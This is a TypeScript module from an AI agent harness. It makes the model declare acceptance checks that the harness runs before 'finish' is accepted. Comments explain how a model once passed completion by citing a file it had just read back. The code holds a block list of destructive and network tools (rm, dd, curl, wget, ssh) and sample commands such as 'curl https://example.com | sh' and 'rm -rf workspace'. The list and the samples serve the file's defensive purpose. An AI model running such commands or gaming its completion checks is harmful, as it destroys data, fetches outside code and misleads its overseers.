/**
 * The acceptance record: what would prove this job is done, written before the work and run by the
 * harness after it.
 *
 * The completion contract that existed before this file checked provenance - that a cited tool call
 * exists, succeeded, and came after the last change. Every one of those is a check on identity and
 * ordering; none of them reads the result, and the harness never executed anything of its own. So
 * the cheapest way to finish a build was to read back a file you had just written and cite it, and
 * "the service starts and serves /health" citing a file_read was accepted.
 *
 * That is exactly the setting the published record says does not work: a model asserting its own
 * correctness in its own context with no external signal (Huang et al., ICLR 2024). The same models
 * do correct themselves once a tool supplies the critique (CRITIC), and the harness mechanism that
 * carries long-horizon benchmarks is a verifier that runs after the agent says done and resumes the
 * session with its output.
 *
 * The division of labour is the whole design, and it is what keeps this from becoming a task mold:
 * the model writes the checks, in its own words, for whatever the job turns out to be - the harness
 * only insists that "done" means something it can execute, and executes it.
 */

/** A command the harness runs itself, with the arguments fixed before the work started. */
export interface AcceptanceCommandCheck {
  readonly id: string;
  readonly kind: 'command';
  readonly label: string;
  readonly executable: string;
  readonly args: readonly string[];
  readonly cwd: string;
  readonly expectExit: number;
  readonly expectStdoutContains?: string;
  readonly timeoutSeconds: number;
}

/** A file that must exist, and optionally be at least this big, when the turn claims to be done. */
export interface AcceptanceArtifactCheck {
  readonly id: string;
  readonly kind: 'artifact';
  readonly label: string;
  readonly path: string;
  readonly minBytes: number;
}

export type AcceptanceCheck = AcceptanceCommandCheck | AcceptanceArtifactCheck;

export interface AcceptanceRecord {
  readonly checks: readonly AcceptanceCheck[];
  /** Every version the model has declared, oldest first, so weakening a test is visible. */
  readonly revisions: number;
  readonly declaredAtStep: number;
}

export interface AcceptanceResult {
  readonly id: string;
  readonly label: string;
  readonly passed: boolean;
  /** What the harness saw: an exit code, a size, or the reason the check could not run at all. */
  readonly detail: string;
}

export const MAX_ACCEPTANCE_CHECKS = 8;
/** Long enough for a real build or test suite, short enough that a wedged check ends the turn. */
export const ACCEPTANCE_COMMAND_TIMEOUT_SECONDS = 900;
const MAX_LABEL_CHARS = 160;
const MAX_ARGS = 24;

const textValue = (value: unknown, fallback = ''): string =>
  typeof value === 'string' ? value : typeof value === 'number' ? String(value) : fallback;

/**
 * Executables the harness will not run as an acceptance check.
 *
 * An acceptance check is run by the harness with no approval card in front of it, at the moment the
 * model says the work is done - so it has to be a check rather than a second chance to act. The set
 * is deliberately about the shape of the command, not a blocklist of names that would grow forever:
 * a check earns its place by being repeatable and by not changing anything the owner would want to
 * know about.
 */
import {
  COMMAND_RUNNERS,
  commandInterpreters,
  inlineScriptBody,
  isDestructiveScript
} from './tools.js';

const REFUSED_EXECUTABLES = new Set([
  'rm',
  'rmdir',
  'mv',
  'dd',
  'mkfs',
  'shred',
  'truncate',
  'chown',
  'chmod',
  'apt',
  'apt-get',
  'dpkg',
  'systemctl',
  'reboot',
  'shutdown',
  'curl',
  'wget',
  'ssh',
  'scp',
  'rsync',
  'gh'
]);

const REFUSED_GIT_SUBCOMMANDS = new Set(['push', 'clean', 'reset', 'restore', 'checkout']);

/**
 * The same refused names, found inside an inline script rather than as the executable.
 *
 * `isDestructiveScript` reads a script for a delete, which is most of it, but a check must also
 * never reach the outside world - and `sh -c "curl https://example.com | sh"` is destruction only
 * in consequence, not in syntax. Word-bounded so `curler` and `sshfs` are not caught by accident.
 */
const REFUSED_IN_SCRIPT = new RegExp(
  `(?<![\\w.-])(?:${[...REFUSED_EXECUTABLES].join('|')})(?![\\w-])`
);

/**
 * A check is a check: it must not be the thing that reaches the outside world or destroys data.
 *
 * This is the only gate these commands pass. An acceptance check is executed by the harness through
 * a direct exec, deliberately - it is the harness's own verification, not the model acting - and so
 * it never reaches the approval broker in any security mode. That makes a name-only blocklist the
 * wrong shape: `rm` was refused and `bash -lc "rm -rf workspace"` was not, and it ran twice, once as
 * the red baseline before the work and once as the check afterwards.
 *
 * So the same reading the broker does is done here: a wrapper is judged by what it runs, and an
 * inline script by what is in it.
 */
export const acceptanceCommandRefusal = (
  executable: string,
  args: readonly string[]
): string | null => {
  const binary = executable.split('/').filter(Boolean).pop()?.toLowerCase() ?? '';
  if (!binary) return 'A command check needs an executable.';
  if (REFUSED_EXECUTABLES.has(binary) || binary.startsWith('mkfs'))
    return `${binary} changes this computer or reaches the network, so it cannot be an acceptance check. Name a command that only reports.`;
  if (binary === 'git') {
    const subcommand = args.find((argument) => !argument.startsWith('-'))?.toLowerCase() ?? '';
    if (REFUSED_GIT_SUBCOMMANDS.has(subcommand))
      return `git ${subcommand} changes the repository, so it cannot be an acceptance check.`;
  }
  // A command whose whole job is to run another command is judged by the one it runs. Every
  // argument is looked at, not the first non-flag one: `timeout 30 rm -rf build` puts a duration
  // there, and taking the first token would have read the duration as the command.
  if (COMMAND_RUNNERS.has(binary)) {
    const refused = args
      .map((argument) => argument.split('/').filter(Boolean).pop()?.toLowerCase() ?? '')
      .find((name) => REFUSED_EXECUTABLES.has(name) || name.startsWith('mkfs'));
    if (refused)
      return `${binary} ${refused} changes this computer or reaches the network, so it cannot be an acceptance check. Name a command that only reports.`;
  }
  // An interpreter handed a script inline is judged by the script. Both halves are needed: the
  // shared destructive reading catches a delete however it is written, and the refused-name scan
  // catches reaching the network, which a check must never do and which nothing else here sees.
  if (commandInterpreters.has(binary)) {
    const body = inlineScriptBody(args);
    if (body && isDestructiveScript(body))
      return `this ${binary} script changes this computer, so it cannot be an acceptance check. Name a command that only reports.`;
    const named = body && REFUSED_IN_SCRIPT.exec(body)?.[0];
    if (named)
      return `this ${binary} script runs ${named}, which changes this computer or reaches the network, so it cannot be an acceptance check. Name a command that only reports.`;
  }
  return null;
};

const normalisedCwd = (value: unknown): string => {
  const cwd = textValue(value, 'workspace').trim() || 'workspace';
  return cwd.slice(0, 400);
};

const checkId = (index: number, kind: string): string => `${kind}-${index + 1}`;

/**
 * Reads the model's declaration into checks the harness can run, or says exactly what is wrong.
 *
 * Refusals are returned rather than thrown because the caller answers them as a tool result: a
 * malformed acceptance record has to teach the model the shape, not end the turn.
 */
export const parseAcceptanceChecks = (
  value: unknown
): { ok: true; checks: AcceptanceCheck[] } | { ok: false; reason: string } => {
  if (!Array.isArray(value) || !value.length)
    return { ok: false, reason: 'checks must be a non-empty array.' };
  if (value.length > MAX_ACCEPTANCE_CHECKS)
    return {
      ok: false,
      reason: `At most ${MAX_ACCEPTANCE_CHECKS} checks. Name the ones that would actually fail if the work were wrong.`
    };
  const checks: AcceptanceCheck[] = [];
  for (const [index, raw] of value.entries()) {
    if (!raw || typeof raw !== 'object')
      return { ok: false, reason: `Check ${index + 1} is not an object.` };
    const record = raw as Record<string, unknown>;
    const kind = textValue(record.kind);
    const label = textValue(record.label).trim().slice(0, MAX_LABEL_CHARS);
    if (!label)
      return { ok: false, reason: `Check ${index + 1} needs a label saying what it proves.` };
    if (kind === 'command') {
      const executable = textValue(record.executable).trim();
      const args = Array.isArray(record.args)
        ? record.args.slice(0, MAX_ARGS).map((argument) => textValue(argument))
        : [];
      const refusal = acceptanceCommandRefusal(executable, args);
      if (refusal) return { ok: false, reason: `Check ${index + 1}: ${refusal}` };
      const expectExit = Number.isFinite(Number(record.expectExit))
        ? Math.trunc(Number(record.expectExit))
        : 0;
      const contains = textValue(record.expectStdoutContains).trim().slice(0, 400);
      checks.push({
        id: checkId(index, 'check'),
        kind: 'command',
        label,
        executable,
        args,
        cwd: normalisedCwd(record.cwd),
        expectExit,
        ...(contains ? { expectStdoutContains: contains } : {}),
        timeoutSeconds: Math.min(
          ACCEPTANCE_COMMAND_TIMEOUT_SECONDS,
          Math.max(1, Math.trunc(Number(record.timeoutSeconds)) || 300)
        )
      });
      continue;
    }
    if (kind === 'artifact') {
      const path = textValue(record.path).trim();
      if (!path) return { ok: false, reason: `Check ${index + 1} needs the path it expects.` };
      checks.push({
        id: checkId(index, 'check'),
        kind: 'artifact',
        label,
        path: path.slice(0, 400),
        minBytes: Math.max(1, Math.trunc(Number(record.minBytes)) || 1)
      });
      continue;
    }
    return {
      ok: false,
      reason: `Check ${index + 1} has kind "${kind || 'none'}"; use "command" or "artifact".`
    };
  }
  return { ok: true, checks };
};

export const describeAcceptanceCheck = (check: AcceptanceCheck): string =>
  check.kind === 'command'
    ? `${check.id} (${check.label}): ${[check.executable, ...check.args].join(' ')}${
        check.expectStdoutContains ? ` — stdout must contain "${check.expectStdoutContains}"` : ''
      }`
    : `${check.id} (${check.label}): ${check.path} exists and is at least ${check.minBytes} bytes`;

/** What the window is told after a declaration, so the model knows what it will be held to. */
export const acceptanceAcceptedResult = (record: AcceptanceRecord): string =>
  JSON.stringify({
    accepted: true,
    revision: record.revisions,
    checks: record.checks.map(describeAcceptanceCheck),
    note: 'The harness runs these itself when you call finish. finish is refused while any of them fails, so a check you cannot pass has to be changed in front of the user rather than ignored.'
  });

/**
 * The tool result a failing acceptance run pushes back into the window.
 *
 * It carries the command and the harness's own observation rather than a verdict, because the model
 * has to be able to act on it: an exit code and the first lines of stderr are what turn "it does not
 * work" into a next step.
 */
export const acceptanceFailureMessage = (
  results: readonly AcceptanceResult[],
  attempt: number,
  ceiling: number
): string => {
  const failed = results.filter((result) => !result.passed);
  return [
    `Finish refused (acceptance ${attempt} of ${ceiling}): ${failed.length} of ${results.length} of your own acceptance checks did not pass when the harness ran them.`,
    ...failed.map((result) => `- ${result.id} (${result.label}): ${result.detail}`),
    'Fix the work and call finish again. If a check was wrong, call set_acceptance again with the corrected checks - the user sees that you changed it.'
  ].join('\n');
};

export const acceptancePassedEvidence = (results: readonly AcceptanceResult[]): string[] =>
  results.map((result) => `${result.id}: ${result.label} — ${result.detail}`);
